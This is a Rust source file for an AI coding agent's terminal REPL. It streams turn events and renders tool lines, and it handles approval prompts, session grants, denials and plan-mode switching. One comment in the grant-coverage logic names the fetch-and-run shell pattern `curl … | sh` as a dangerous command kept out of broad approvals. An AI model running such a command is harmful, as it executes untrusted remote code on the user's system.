//! Turn event pump for the REPL: drains `EngineHandle::rx_event` for one
//! turn and renders it as plain terminal lines (port of the exec pump in
//! `main::run_exec_agent` plus the accounting half of the retired TUI
//! event loop).
//!
//! Rendering protocol: permanent output (assistant text, tool lines) goes
//! to stdout as whole lines. Tool calls print one collapsed line on
//! completion by default (Ctrl+O in-turn, `/expand` after the fact — the
//! terminal is append-only, so expansion is a replay, never a rewrite).
//! While the turn runs, a transient region of up to two rows is refreshed
//! in place via `ESC[2K CR`: the live status line, and — once the user types
//! — the composer the typed line lands in. The region is never interleaved
//! with permanent text: every permanent write clears it first, and the
//! blocking prompts (approval / user input / elevation) clear it too before
//! they take stdin. The status-line ticker additionally yields while a
//! permanent row is open, so streamed text is never force-closed (broken
//! mid-word) just to refresh a frame the next delta would erase anyway.
//!
//! Known limitations (recorded beside the behaviour it owns): assistant text
//! is printed verbatim as the model streams it — there is no markdown
//! rendering and no width-aware reflow there, so `**`/backticks and any line
//! breaks the model wrote reach the terminal as-is, and the terminal owns
//! wrapping (and therefore where a CJK paragraph breaks). The one rendered
//! surface is the plan body at the `exit_plan_mode` approval: a completed
//! block goes through [`super::plan_view`], which wraps to the terminal width
//! before styling. Tool lines are single lines assembled from column-capped
//! parts (`tool_summary`), but their total width is not clamped to the
//! terminal, so a narrow terminal still wraps them.
//!
//! The approval prompt refuses with a reason: `[r] <feedback>` — or any line
//! that is not one of the four keys — denies the call and hands the text to
//! the running turn through the engine's steer path (the same mid-turn input
//! the composer's queue uses), so the refusal and the reason are both
//! recorded. Only the tool gate offers it; the path-access and
//! sandbox-elevation questions keep their own smaller answer sets.

use std::collections::{HashMap, HashSet};
use std::io::{IsTerminal, Write};
use std::time::{Duration, Instant};

use colored::Colorize;
use unicode_width::UnicodeWidthStr;

use super::keys::TurnKey;
use super::state::ReplState;
use crate::app_state::AppMode;
use crate::core::events::{Event, TurnOutcomeStatus};
use crate::core::ops::Op;
use crate::hooks::HookEvent;
use codesmith_agent_runtime::error_taxonomy::ErrorEnvelope;
use codesmith_agent_runtime::mode::ApprovalMode;
use codesmith_tools::{ToolError, ToolResult};

/// Interval between live-line refreshes (spinner/elapsed/ctx).
const LIVE_REFRESH: Duration = Duration::from_millis(250);

/// Prompt for the mid-turn composer row.
const COMPOSER_PROMPT: &str = "❯ ";

/// How long the second Ctrl+X Ctrl+K has to arrive to stop everything.
const STOP_ALL_WINDOW: Duration = Duration::from_secs(3);

/// Why the pump returned.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PumpExit {
    /// The engine emitted `TurnComplete`.
    TurnDone,
    /// The event channel closed — the engine task is gone.
    EngineGone,
    /// The user pressed Ctrl+C twice.
    UserQuit,
}

/// The mid-turn composer: what the user types while a turn streams.
///
/// Pure buffer editing so the editing rules are unit-tested; drawing the row
/// and parking the cursor is [`TurnView`]'s job. Insert/delete are
/// char-aware, so multi-byte input (and paste) never splits a character.
#[derive(Default)]
struct Composer {
    buffer: String,
    /// Cursor position as a byte offset into `buffer`, always on a char
    /// boundary.
    cursor: usize,
}

impl Composer {
    fn is_empty(&self) -> bool {
        self.buffer.is_empty()
    }

    fn insert(&mut self, c: char) {
        self.buffer.insert(self.cursor, c);
        self.cursor += c.len_utf8();
    }

    fn backspace(&mut self) {
        if let Some(prev) = self.buffer[..self.cursor].chars().next_back() {
            self.cursor -= prev.len_utf8();
            self.buffer.remove(self.cursor);
        }
    }

    fn delete(&mut self) {
        if self.cursor < self.buffer.len() {
            self.buffer.remove(self.cursor);
        }
    }

    fn move_left(&mut self) {
        if let Some(prev) = self.buffer[..self.cursor].chars().next_back() {
            self.cursor -= prev.len_utf8();
        }
    }

    fn move_right(&mut self) {
        if let Some(next) = self.buffer[self.cursor..].chars().next() {
            self.cursor += next.len_utf8();
        }
    }

    fn move_home(&mut self) {
        self.cursor = 0;
    }

    fn move_end(&mut self) {
        self.cursor = self.buffer.len();
    }

    fn kill_to_end(&mut self) -> String {
        self.buffer.split_off(self.cursor)
    }

    fn kill_to_start(&mut self) -> String {
        let head: String = self.buffer.drain(..self.cursor).collect();
        self.cursor = 0;
        head
    }

    /// Ctrl+W: back to the previous whitespace, matching readline and
    /// Claude Code (one press removes a whole path).
    fn kill_word(&mut self) -> String {
        let head = &self.buffer[..self.cursor];
        let cut = head
            .trim_end()
            .rfind(char::is_whitespace)
            .map_or(0, |i| i + 1);
        let removed = self.buffer[cut..self.cursor].to_string();
        self.buffer.replace_range(cut..self.cursor, "");
        self.cursor = cut;
        removed
    }

    /// Empty the composer and hand the text over (Enter, or send-now).
    fn take(&mut self) -> String {
        self.cursor = 0;
        std::mem::take(&mut self.buffer)
    }
}

/// One-turn rendering state.
struct TurnView {
    live_active: bool,
    current_tool: Option<String>,
    ends_with_newline: bool,
    /// Started-but-not-completed tool calls, keyed by tool-call id — the
    /// collapsed form prints only on completion. Keyed, not a single slot:
    /// one message can carry several calls of the same tool (two `agent_open`
    /// calls, one per repository), and a by-name slot pairs a completion with
    /// whichever call was announced last, mislabeling both lines.
    pending_tools: HashMap<String, (String, Option<String>)>,
    /// The last permanent line was a tool/agent line; the next assistant
    /// message gets a blank separator so the answer stands out.
    after_tool_line: bool,
    /// The mid-turn composer; empty means its row is not drawn.
    composer: Composer,
    /// Rows the live region occupies right now: 0, 1 (status), or 2 (status
    /// + composer).
    live_rows: usize,
    /// When Ctrl+X Ctrl+K was last pressed, for its confirm window.
    stop_all_at: Option<Instant>,
}

impl TurnView {
    fn new() -> Self {
        Self {
            live_active: false,
            current_tool: None,
            ends_with_newline: true,
            pending_tools: HashMap::new(),
            after_tool_line: false,
            composer: Composer::default(),
            live_rows: 0,
            stop_all_at: None,
        }
    }

    /// Clear the whole live region (status row and composer row).
    fn clear_live(&mut self) {
        match self.live_rows {
            // Clear the composer row first, step up, clear the status row.
            2 => eprint!("\x1b[2K\r\x1b[1A\x1b[2K\r"),
            1 => eprint!("\x1b[2K\r"),
            _ => {}
        }
        self.live_rows = 0;
        self.live_active = false;
    }

    /// Claim the cursor's row(s) for one live frame.
    ///
    /// A live frame is a whole-row write, so it closes an open permanent row
    /// first (a prompt whose answer arrived without an echoed newline) and
    /// then erases whatever the row held before redrawing from column 0.
    /// Without both halves the frame shares a row with permanent text: it
    /// was appended to the open row, and the next frame's `ESC[2K` erased
    /// that row's real content with it.
    ///
    /// The composer row is drawn from the same call, so a keystroke only has
    /// to update the buffer and redraw. The caller owns the row-closing
    /// policy: the ticker goes through [`Self::tick_live`], which never
    /// closes a row, while composer redraws close one deliberately — user
    /// input must be visible immediately.
    fn draw_live(&mut self, frame: &str) {
        self.clear_live();
        if !self.ends_with_newline {
            println!();
            self.ends_with_newline = true;
        }
        eprint!("\r\x1b[K{frame}");
        self.live_rows = 1;
        if !self.composer.is_empty() {
            eprint!("\n\r\x1b[K{COMPOSER_PROMPT}{}", self.composer.buffer);
            // Park the cursor at the caret. Column math is display width,
            // and assumes the row fits the terminal (see the module note in
            // keys.rs about what the composer does not do).
            let column = UnicodeWidthStr::width(COMPOSER_PROMPT)
                + UnicodeWidthStr::width(&self.composer.buffer[..self.composer.cursor]);
            if column > 0 {
                eprint!("\r\x1b[{column}C");
            }
            self.live_rows = 2;
        }
        let _ = std::io::stderr().flush();
        self.live_active = true;
    }

    /// One status-line refresh from the `LIVE_REFRESH` ticker.
    ///
    /// The ticker never closes an open permanent row: doing so breaks a
    /// streamed line mid-word wherever the stream happened to pause (the
    /// break is permanent — the terminal is append-only), while the frame
    /// itself is erased by the next delta within milliseconds. So an open
    /// row simply skips the frame; it resumes once the row closes.
    fn tick_live(&mut self, frame: &str) {
        if !self.ends_with_newline {
            return;
        }
        self.draw_live(frame);
    }
}

/// Read one line from stdin without holding the async worker hostage.
///
/// The prompt is written without a trailing newline so the answer echoes on the
/// prompt's own row. A terminal echoes the Enter that ends the answer, which
/// terminates that row; a pipe, or Ctrl+D, does not — and an open row is what
/// let a later live frame glue itself to the prompt text.
async fn read_stdin_line(prompt: &str) -> String {
    print!("{prompt}");
    let _ = std::io::stdout().flush();
    let echo_terminates_row = std::io::stdin().is_terminal();
    let prompt_owned = prompt.to_string();
    let (line, hit_eof) = tokio::task::spawn_blocking(move || {
        let mut line = String::new();
        let read = std::io::stdin().read_line(&mut line);
        let _ = prompt_owned;
        (line.trim().to_string(), matches!(read, Ok(0) | Err(_)))
    })
    .await
    .unwrap_or_default();
    if hit_eof || !echo_terminates_row {
        println!();
    }
    line
}

/// One-line action label for an approval prompt: the call's argument summary
/// when it has one, else the first sentence of the tool's static description.
///
/// The description is the wrong label for the question — a paragraph for
/// shell-like tools, it buried the actual call under prose and read as if the
/// whole paragraph were the thing being approved.
fn approval_action(description: &str, args_summary: Option<&str>) -> String {
    if let Some(args) = args_summary.filter(|args| !args.trim().is_empty()) {
        return args.to_string();
    }
    let first_line = description.lines().next().unwrap_or(description);
    let first_sentence = first_line
        .split_once(". ")
        .map_or(first_line, |(head, _)| head);
    crate::localization::truncate_to_width(first_sentence, APPROVAL_LABEL_MAX)
}

/// Cap on the fallback action label, in terminal columns (CJK counts as two),
/// so the header stays one row on a terminal wider than the cap.
const APPROVAL_LABEL_MAX: usize = 100;

/// Separator between the parts of a multi-part grouping key
/// (`shell:cargo build + git status`), written by
/// `build_approval_grouping_key`. One grant per part: `[a]` records each, and
/// a later call is covered only when *every* one of its parts is granted.
const GROUPING_PART_SEPARATOR: &str = " + ";

/// The parts of a `[a]` grant: a compound shell command names one family per
/// top-level segment, everything else is a single part.
fn grouping_parts(grouping_key: &str) -> Vec<&str> {
    grouping_key.split(GROUPING_PART_SEPARATOR).collect()
}

/// Record `[a]`: what the prompt promised this answer covers.
///
/// A multi-part key records each part on its own, so a later command that uses
/// *some* of those families still matches (the same rule the engine's key
/// encodes), rather than needing a byte-identical chain.
fn record_always_approved(approved: &mut HashSet<String>, grouping_key: &str) {
    for part in grouping_parts(grouping_key) {
        approved.insert(part.to_string());
    }
}

/// Whether a call is covered by the session's `[a]` answers or a persisted
/// grant: **every** part of the key must be approved.
///
/// This is the coverage half of [`record_always_approved`] — a compound
/// command needs all of its families approved, so `[a]` on `cargo build` never
/// quietly authorizes the `curl … | sh` behind it (that call is `Dangerous`, so
/// it gets no family at all and lands here as one exact part).
fn approval_always_granted(
    approved: &HashSet<String>,
    grants: &crate::approval_grants::ApprovalGrants,
    workspace_key: &str,
    grouping_key: &str,
) -> bool {
    grouping_parts(grouping_key)
        .into_iter()
        .all(|part| approved.contains(part) || grants.is_granted(workspace_key, part))
}

/// Whether a call is blocked by the session's denials: the exact key (what
/// the prompt's `[e]` records), the whole grouping key, or **any** of the
/// call's shell families (what `/permissions deny <command>` records — the
/// same `shell:<family>` keys `/permissions allow` writes).
///
/// The inverse of [`approval_always_granted`]: a grant needs every part
/// approved, a denial vetoes when any family is denied — so `deny git status`
/// also refuses a later `git status && cargo build`. A compound key joins
/// bare family names (`shell:cargo build + git status` — only the first
/// carries the prefix), so each family is re-prefixed before the lookup.
fn approval_session_denied(denied: &HashSet<String>, exact_key: &str, grouping_key: &str) -> bool {
    if denied.contains(exact_key) || denied.contains(grouping_key) {
        return true;
    }
    grouping_key.strip_prefix("shell:").is_some_and(|families| {
        families
            .split(GROUPING_PART_SEPARATOR)
            .any(|family| denied.contains(&format!("shell:{family}")))
    })
}

/// What `[a]` actually covers for this tool, in the user's words.
///
/// The scope is decided engine-side by `build_approval_grouping_key`, and the
/// key itself names the shape — the engine's classifier is the source of truth
/// for the per-tool families, while two shapes are visible only in the key: an
/// `exact:` key (a `Dangerous` command, which gets no family) covers this call
/// and nothing else, and a multi-part key covers several families at once.
/// Only the deny key is exact-call scoped — the legend's `[e]` says so itself.
fn approval_always_scope(tool_name: &str, grouping_key: &str) -> String {
    use codesmith_agent_runtime::tools::approval_cache::{
        EXACT_CALL_KEY_PREFIX, GroupingKeyKind, grouping_key_kind,
    };
    if grouping_key.starts_with(EXACT_CALL_KEY_PREFIX) {
        return "this exact call".to_string();
    }
    match grouping_key_kind(tool_name) {
        GroupingKeyKind::ShellPrefix => match grouping_parts(grouping_key).len() {
            0 | 1 => "this command family".to_string(),
            _ => "each of these command families".to_string(),
        },
        GroupingKeyKind::PatchPaths => "patches to the same paths".to_string(),
        GroupingKeyKind::NetHost => "requests to the same host".to_string(),
        GroupingKeyKind::ToolName => format!("every {tool_name} call"),
    }
}

/// The approval question, whole: what is being asked, why, and what each answer
/// scopes to. Ends at the unterminated prompt — the answer echoes on that row,
/// and [`read_stdin_line`] decides whether the row still needs terminating.
fn approval_frame(
    tool_name: &str,
    description: &str,
    args_summary: Option<&str>,
    intent_summary: Option<&str>,
    always_scope: &str,
) -> String {
    let mut frame = format!(
        "{} approval needed: {} — {}\n",
        "⚠".yellow(),
        tool_name.bold(),
        approval_action(description, args_summary)
    );
    if let Some(intent) = intent_summary.map(str::trim).filter(|i| !i.is_empty()) {
        frame.push_str(&format!("{}\n", format!("  intent: {intent}").dimmed()));
    }
    frame.push_str(&format!(
        "allow? [y] run it once · [a] always allow {always_scope} for this session \
         · [o] yolo — shell + trust + auto-approve for the rest of this session \
         · [e] never this exact call · [r] <feedback> deny and tell the model why: "
    ));
    frame
}

/// The re-ask after a bare `[r]`: the introducer said "I want to refuse with a
/// reason", so the next line is read for the reason. Repeating the whole
/// question would bury that one instruction; this is the shortest line that
/// says what to type next. Ends at the unterminated prompt, like
/// [`approval_frame`].
fn feedback_needed_frame() -> String {
    "feedback? type what should change (y/a/o/e still answer the question above): ".to_string()
}

/// What an approval answer does. Split from the prompt for the same reason as
/// [`parse_path_access_answer`]: mapping a typed line to (allow, deny, refuse
/// with feedback) is the security-relevant half, and this way it is testable
/// without stdin.
#[derive(Debug, Clone, PartialEq, Eq)]
enum ApprovalAnswer {
    /// `[y]` — approve this one call.
    RunOnce,
    /// `[a]` — approve, and remember the grouping key for this session.
    AlwaysSession,
    /// `[o]` — approve, and switch the session into the YOLO posture
    /// (`/yolo`: shell + trust + auto-approve) so no later gate asks. Session
    /// only: nothing is persisted, and `/mode <mode>` switches back.
    Yolo,
    /// `[e]` — deny, and remember this exact call for this session.
    NeverThis,
    /// Any other line — `[r] <feedback>` or the feedback on its own — denies
    /// the call and hands the text to the running turn as a user message (the
    /// engine's steer path) so the model can revise.
    Revise(String),
    /// `[r]` on its own: the introducer asks for the text on the next line
    /// instead of sending an empty reason.
    NeedFeedback,
    /// An empty line, EOF, or the `n`/`no` keys (off the legend; they still
    /// match) — the fail-closed default, which refuses the call without
    /// telling the model anything.
    Skip,
}

/// The legend's keys match the whole line, exactly as the inline match they
/// replace did: `y please` is not a yes, and it is not `n` either — it is
/// feedback, which denies the call just the same. The `n`/`no` skip keys are
/// off the legend but still match, so muscle memory lands on the fail-closed
/// skip instead of steering a bare letter at the model.
fn parse_approval_answer(raw: &str) -> ApprovalAnswer {
    let trimmed = raw.trim();
    match trimmed.to_ascii_lowercase().as_str() {
        "y" | "yes" => ApprovalAnswer::RunOnce,
        "a" | "always" => ApprovalAnswer::AlwaysSession,
        "o" | "yolo" => ApprovalAnswer::Yolo,
        "e" | "never" => ApprovalAnswer::NeverThis,
        "n" | "no" | "" => ApprovalAnswer::Skip,
        _ => parse_feedback_answer(trimmed),
    }
}

/// Everything that is not one of the whole-line keys is the feedback the user
/// wants the model to hear.
///
/// The `r`/`revise` introducer is optional: requiring it dropped the reason of
/// every user who typed their sentence straight at the prompt — the line was
/// read as "unrecognized" and refused silently, so the model was told nothing
/// while the terminal looked like something had been said. `r`, `r:`, and
/// `revise` with no text after them ask for it on the next line.
///
/// The introducer is matched case-insensitively; the feedback keeps the case
/// the user typed, because lowercasing the line (what the inline match did)
/// turned `r Fix PlanView` into `fix planview`.
fn parse_feedback_answer(line: &str) -> ApprovalAnswer {
    let (key, rest) = match line.split_once(char::is_whitespace) {
        Some((key, rest)) => (key, rest),
        None => (line, ""),
    };
    let bare_key = key.trim_end_matches(':');
    let introduces = bare_key.eq_ignore_ascii_case("r") || bare_key.eq_ignore_ascii_case("revise");
    if !introduces {
        return ApprovalAnswer::Revise(line.to_string());
    }
    let feedback = rest.trim_start_matches(':').trim();
    if feedback.is_empty() {
        ApprovalAnswer::NeedFeedback
    } else {
        ApprovalAnswer::Revise(feedback.to_string())
    }
}

/// The plan gate's answer mapping — [`parse_approval_answer`] without the two
/// remember-keys. `a`/`always`, `e`/`never`, and `o`/`yolo` still answer in the
/// direction they point (approve / reject, remembered for nothing): a key
/// pressed from the generic gate's muscle memory must not fall through to
/// `Revise` and steer a bare letter at the model. The posture switch itself is
/// not offered here, for the same reason as the remember-keys below.
fn parse_plan_approval_answer(raw: &str) -> ApprovalAnswer {
    let trimmed = raw.trim();
    match trimmed.to_ascii_lowercase().as_str() {
        "y" | "yes" | "a" | "always" | "o" | "yolo" => ApprovalAnswer::RunOnce,
        "n" | "no" | "e" | "never" | "" => ApprovalAnswer::Skip,
        _ => parse_feedback_answer(trimmed),
    }
}

/// The plan-approval question — [`approval_frame`]'s shape for the one gate
/// that decides about a plan, not a tool call. Three choices, no remember-keys:
/// an approval that outlives the plan it answered would silence the review of
/// every revised plan after it. Ends at the unterminated prompt, like
/// [`approval_frame`].
fn plan_approval_frame() -> String {
    "approve this plan? [y] approve and implement · [n] reject (plan mode stays) · \
     [r] <feedback> revise: "
        .to_string()
}

/// Steered into the running turn when the plan gate rejects: a bare
/// permission error does not say *what* was refused, so the model is told the
/// plan was rejected and where to go next.
const PLAN_REJECTED_NOTE: &str = "The user rejected this plan without feedback. Stay in plan \
                                  mode: revise the plan file and present it again with \
                                  exit_plan_mode.";

/// Columns the plan block indents by. Rendering runs at the full terminal
/// width first; this prefix is a visual marker applied after the reflow.
const PLAN_BLOCK_INDENT: usize = 4;

/// The plan body printed before the `exit_plan_mode` approval question.
///
/// Rendered with [`super::plan_view`]'s width-aware reflow, indented like the
/// REPL's detail blocks. A missing or empty plan is a loud notice (the model
/// skipped `write_plan_file`), never a silent empty block: the approval still
/// proceeds, but the user can see what is being approved is nothing.
async fn plan_approval_block(state: &ReplState) -> String {
    let slug = state.plan_mode_state.lock().await.current_slug.clone();
    let (body, path) = match slug.as_deref() {
        Some(slug) => {
            let read = codesmith_tool_impls::tools::plan_file::read_plan_file(slug).await;
            (read.ok().flatten(), slug.to_string())
        }
        None => (None, "(unset)".to_string()),
    };
    match body.as_deref().map(str::trim) {
        Some(plan) if !plan.is_empty() => {
            let rendered = super::plan_view::render_plan(plan);
            let mut block = String::from("\n  已定稿的计划（plan mode）:\n\n");
            for line in rendered {
                block.push_str(" ".repeat(PLAN_BLOCK_INDENT).as_str());
                block.push_str(&line);
                block.push('\n');
            }
            block.push('\n');
            block
        }
        _ => format!(
            "{} plan file {path} has no content — approving approves nothing\n",
            "⚠".yellow()
        ),
    }
}

/// What a plan-mode tool result means for this session's mode — the pure half;
/// [`apply_plan_mode_sync`] performs the switch.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PlanModeSync {
    /// `enter_plan_mode` succeeded: follow the model into Plan.
    Enter,
    /// `exit_plan_mode` succeeded: return to the mode the session came from.
    Exit(AppMode),
}

/// Map a finished plan tool to the mode change it implies, if any.
///
/// The plan tools read `PlanModeState`, which says only whether the *model*
/// opened a plan session; the session's own mode — the status line and each
/// turn's tool registry — is the REPL's to own, and nothing else bridges the
/// two. The gap was user-visible in both directions: an approved
/// `exit_plan_mode` left the session in Plan, whose registry carries no
/// `apply_patch`/`write_file`/shell, so the model that had just been told the
/// plan was approved had nothing to implement it with; and a model-initiated
/// `enter_plan_mode` left the write tools registered, so plan mode's read-only
/// contract never applied.
///
/// A refused plan tool is a no-op here: `[r] <feedback>` — or a plain skip —
/// leaves plan mode active and the plan file intact, which is the revise loop.
fn plan_mode_sync_after_tool(
    name: &str,
    result: &Result<ToolResult, ToolError>,
    restore_fallback: Option<AppMode>,
) -> Option<PlanModeSync> {
    // Only a call that ran and succeeded moves the mode — a dispatch error, and
    // a `success: false` result ("Not in plan mode", a slug inconsistency), both
    // leave the session where it is.
    let result = result.as_ref().ok()?;
    if !result.success {
        return None;
    }
    match name {
        "enter_plan_mode" => Some(PlanModeSync::Enter),
        "exit_plan_mode" => Some(PlanModeSync::Exit(
            restore_fallback.unwrap_or(AppMode::Agent),
        )),
        _ => None,
    }
}

/// Apply [`plan_mode_sync_after_tool`].
///
/// Known limitation, beside the behaviour it owns: a turn's tool registry is
/// built once at turn start, so a mode switched here reaches the *next* turn.
/// The plan approval is the one place that matters, and the engine closes it
/// there: `should_stop_after_plan_tool` ends a Plan turn on the approved
/// `exit_plan_mode`, so the next message is dispatched with the restored
/// toolset instead of the model working a plan it cannot implement in the turn
/// it is in. The REPL then submits that message itself
/// (`plan_implementation_pending`), so approval continues straight into the
/// implementation instead of waiting for the user to type.
async fn apply_plan_mode_sync(state: &mut ReplState, sync: PlanModeSync) {
    match sync {
        PlanModeSync::Enter => {
            if state.mode != AppMode::Plan {
                state.set_mode(AppMode::Plan);
            }
        }
        PlanModeSync::Exit(restored) => {
            state.set_mode(restored);
            state.plan_implementation_pending = true;
            println!(
                "{}",
                format!("◇ plan approved · {} mode restored", restored.as_setting()).dimmed()
            );
        }
    }
}

/// Pump engine events until the current turn finishes.
pub async fn pump_turn(state: &mut ReplState) -> anyhow::Result<PumpExit> {
    let mut view = TurnView::new();
    let mut cancelled_once = false;
    let mut live_ticker = tokio::time::interval(LIVE_REFRESH);
    live_ticker.tick().await; // first tick fires immediately; discard
    let mut keys = super::keys::KeyTap::start();

    let engine = match state.engine.as_ref() {
        Some(engine) => engine.clone(),
        None => return Ok(PumpExit::EngineGone),
    };

    loop {
        let event = tokio::select! {
            event = async {
                let mut rx = engine.rx_event.write().await;
                rx.recv().await
            } => event,
            key = keys.recv() => {
                // None: the tap is gone (non-TTY stdin) — the composer and
                // its keys are unavailable; the turn runs on.
                if let Some(key) = key {
                    handle_turn_key(state, &mut view, key, &engine).await;
                }
                continue;
            }
            _ = live_ticker.tick() => {
                let frame = super::status::live_line(state, view.current_tool.as_deref());
                view.tick_live(&frame);
                continue;
            }
            _ = tokio::signal::ctrl_c() => {
                if cancelled_once {
                    println!();
                    return Ok(PumpExit::UserQuit);
                }
                cancelled_once = true;
                engine.cancel();
                view.clear_live();
                println!("{}", "^C — cancelling (Ctrl+C again to quit)".yellow());
                continue;
            }
        };

        let Some(event) = event else {
            view.clear_live();
            return Ok(PumpExit::EngineGone);
        };

        match event {
            Event::TurnStarted { .. } => {
                state.is_loading = true;
                state.turn_started_at = Some(Instant::now());
                state.tool_log_turn += 1;
                save_crash_recovery_checkpoint(state);
            }
            Event::MessageStarted { .. } => {
                view.clear_live();
                if view.after_tool_line {
                    println!();
                    view.after_tool_line = false;
                }
            }
            Event::MessageDelta { content, .. } => {
                view.clear_live();
                // Bold so the answer stands out between the styled tool
                // lines around it.
                print!("{}", content.bold());
                let _ = std::io::stdout().flush();
                view.ends_with_newline = content.ends_with('\n');
            }
            Event::MessageComplete { .. } => {
                view.clear_live();
                if !view.ends_with_newline {
                    println!();
                    view.ends_with_newline = true;
                }
            }
            Event::ThinkingDelta { .. }
            | Event::ThinkingStarted { .. }
            | Event::ThinkingComplete { .. } => {
                // Known limitation: reasoning deltas are not streamed in
                // the REPL (see module notes in state.rs).
            }
            Event::LlmRequest { .. } => {}
            Event::ToolCallStarted { id, name, input } => {
                view.clear_live();
                let args_summary = crate::tool_summary::summarize_tool_args(&input);
                if state.tool_detail {
                    // Expanded form keeps the immediate ⏺ line; the
                    // collapsed form stays silent until completion (the
                    // live line shows the running tool meanwhile).
                    let args = args_summary
                        .as_ref()
                        .map(|summary| format!("({summary})"))
                        .unwrap_or_default();
                    println!("{} {}{}", "⏺".cyan(), name.cyan(), args.dimmed());
                }
                view.current_tool = Some(name.clone());
                view.pending_tools.insert(id, (name, args_summary));
            }
            Event::ToolCallProgress { .. } => {}
            Event::ToolCallComplete { id, name, result } => {
                view.clear_live();
                if view.current_tool.as_deref() == Some(name.as_str()) {
                    view.current_tool = None;
                }
                let args_summary = view.pending_tools.remove(&id).and_then(|(_, args)| args);
                let args = args_summary
                    .as_ref()
                    .map(|summary| format!("({summary})"))
                    .unwrap_or_default();
                // Read the result before the match consumes it: the plan tools
                // are the pair whose outcome moves this session's mode.
                let plan_sync = plan_mode_sync_after_tool(&name, &result, state.plan_restore_mode);
                match result {
                    Ok(output) => {
                        let summary = crate::tool_summary::summarize_tool_output(&output.content);
                        if state.tool_detail {
                            if summary.is_empty() {
                                println!("  {} ok", "⎿".dimmed());
                            } else {
                                println!("  {} {}", "⎿".dimmed(), summary.dimmed());
                            }
                        } else {
                            let tail = if summary.is_empty() {
                                "ok".to_string()
                            } else {
                                summary
                            };
                            println!(
                                "{} {}{} {} {}",
                                "⏺".cyan(),
                                name.cyan(),
                                args.dimmed(),
                                "⎿".dimmed(),
                                tail.dimmed()
                            );
                        }
                        push_tool_record(state, &name, args_summary, Some(output.content), None);
                    }
                    Err(err) => {
                        let message = err.to_string();
                        // A guard rejection carries its own remedy and the
                        // model retries without the user — warn in yellow,
                        // keep genuine failures red.
                        let (glyph, tail) = if matches!(err, ToolError::Rejected { .. }) {
                            ("⎿".yellow(), message.yellow())
                        } else {
                            ("⎿".red(), format!("failed: {message}").red())
                        };
                        if state.tool_detail {
                            println!("  {glyph} {tail}");
                        } else {
                            println!(
                                "{} {}{} {glyph} {tail}",
                                "⏺".cyan(),
                                name.cyan(),
                                args.dimmed()
                            );
                        }
                        push_tool_record(state, &name, args_summary, None, Some(message));
                    }
                }
                view.after_tool_line = true;
                if let Some(sync) = plan_sync {
                    apply_plan_mode_sync(state, sync).await;
                }
                // A queued message goes to the model as soon as the tool
                // calls it waited on finish — Claude Code's rule — rather
                // than waiting for the turn to end.
                flush_queue_into_turn(state, &mut view, &engine).await;
                // Keep the sub-agent cache fresh after agent-lifecycle
                // tools: several of them move the record without a
                // spawn/complete event of their own (`agent_cancel` marks
                // the child cancelled and fires nothing).
                if matches!(
                    name.as_str(),
                    "agent_open"
                        | "agent_eval"
                        | "agent_close"
                        | "agent_cancel"
                        | "agent_wait"
                        | "agent_result"
                        | "agent_status"
                        | "agent_spawn"
                ) {
                    refresh_subagent_cache(state, &engine).await;
                }
            }
            Event::AgentSpawned { id, prompt } => {
                state
                    .agent_progress
                    .insert(id.clone(), "running".to_string());
                // The 🤖 count comes from the record, so re-read it as soon
                // as a child exists: a foreground `agent_run` runs its child
                // *inside* the tool call, and waiting for that call to return
                // would leave the count at 0 for the whole child.
                refresh_subagent_cache(state, &engine).await;
                view.clear_live();
                println!(
                    "{} spawned {id}: {}",
                    "◇".cyan(),
                    crate::tool_summary::summarize_tool_output(&prompt).dimmed()
                );
                view.after_tool_line = true;
            }
            Event::AgentProgress { id, status } => {
                state.agent_progress.insert(id, status);
            }
            Event::AgentComplete { id, result } => {
                state.agent_progress.remove(&id);
                // A child that finishes on its own has no tool call to hang a
                // refresh on, so the 🤖 count would keep it until the next
                // spawn. Re-read the record here: the number comes from it,
                // and this is the event that says it moved.
                refresh_subagent_cache(state, &engine).await;
                view.clear_live();
                println!(
                    "{} agent {id} done: {}",
                    "◇".dimmed(),
                    crate::tool_summary::summarize_tool_output(&result).dimmed()
                );
                view.after_tool_line = true;
            }
            Event::SubAgentMailbox { .. } => {}
            Event::ApprovalRequired {
                id,
                tool_name,
                description,
                input,
                approval_key,
                approval_grouping_key,
                intent_summary,
            } => {
                handle_approval(
                    state,
                    &engine,
                    &mut view,
                    &mut keys,
                    id,
                    tool_name,
                    description,
                    input,
                    approval_key,
                    approval_grouping_key,
                    intent_summary,
                )
                .await;
            }
            Event::UserInputRequired { id, request } => {
                handle_user_input(state, &engine, &mut view, &mut keys, id, request).await;
            }
            Event::PathAccessRequired {
                id,
                tool_name,
                path,
            } => {
                handle_path_access(state, &engine, &mut view, &mut keys, id, tool_name, path).await;
            }
            Event::ElevationRequired {
                tool_id,
                tool_name,
                command,
                denial_reason,
                ..
            } => {
                handle_elevation(
                    state,
                    &engine,
                    &mut view,
                    &mut keys,
                    tool_id,
                    tool_name,
                    command,
                    denial_reason,
                )
                .await;
            }
            Event::CompactionStarted { message, .. } => {
                state.is_compacting = true;
                view.clear_live();
                println!("{} {message}", "≡".magenta());
            }
            Event::CompactionCompleted { message, .. } => {
                state.is_compacting = false;
                view.clear_live();
                println!("{} {message}", "≡".magenta());
            }
            Event::CompactionFailed { message, .. } => {
                state.is_compacting = false;
                view.clear_live();
                println!("{} compaction failed: {message}", "≡".red());
            }
            Event::PurgeStarted { message } => {
                view.clear_live();
                println!("{} {message}", "≡".magenta());
            }
            Event::PurgeCompleted { message, .. } => {
                view.clear_live();
                println!("{} {message}", "≡".magenta());
            }
            Event::PurgeFailed { message } => {
                view.clear_live();
                println!("{} purge failed: {message}", "≡".red());
            }
            Event::SessionUpdated {
                session_id,
                messages,
                system_prompt,
                model,
                ..
            } => {
                state.api_messages = messages;
                state.system_prompt = system_prompt;
                // Round-7 TODO-48 — the queue's journal may be keyed by an
                // id the REPL minted before the engine reported this one;
                // follow the id so journal and session file stay paired.
                let previous_session_id = state.current_session_id.replace(session_id.clone());
                if previous_session_id
                    .as_deref()
                    .is_some_and(|previous| previous != session_id)
                    && let Ok(manager) = crate::session_manager::SessionManager::default_location()
                {
                    super::inbox_journal::rekey(
                        manager.sessions_dir(),
                        previous_session_id.as_deref().unwrap_or_default(),
                        &session_id,
                    );
                }
                if state.auto_model && model != "auto" {
                    state.last_effective_model = Some(model.clone());
                }
            }
            Event::Error { envelope, .. } => {
                view.clear_live();
                println!("{} {}", "✗".red(), error_envelope_message(&envelope).red());
            }
            Event::Status { message } => {
                view.clear_live();
                println!("{}", message.dimmed());
            }
